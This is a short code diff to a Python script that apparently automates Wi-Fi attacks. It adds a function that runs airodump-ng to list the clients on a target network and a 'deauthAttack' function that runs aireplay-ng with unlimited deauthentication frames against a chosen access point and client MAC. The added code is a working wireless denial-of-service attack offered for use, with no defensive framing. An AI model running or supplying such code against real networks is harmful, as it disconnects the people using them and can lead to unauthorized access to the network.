@@ -97,3 +97,10 @@ def setIntoManagedMode(wifiName):
     subprocess.run(["ip", "link", "set", wifiName, "up"])
     subprocess.run(["service", "network-manager", "restart"])
     
+def getClients(hackbssid, hackchannel, wifiName):
+    subprocess.Popen(["airodump-ng", "--bssid", hackbssid, "--channel", hackchannel, "-w", "file", "--write-interval", "1", "output-format", "csv", wifiName], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    
+def deauthAttack(networkMac, targetMac, interface):
+    subprocess.run(["aireplay-ng", "--deauth", "0", "-a", networkMac, "-c", targetMac, interface])
+    
+macAddressRegex = re.compile(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})")
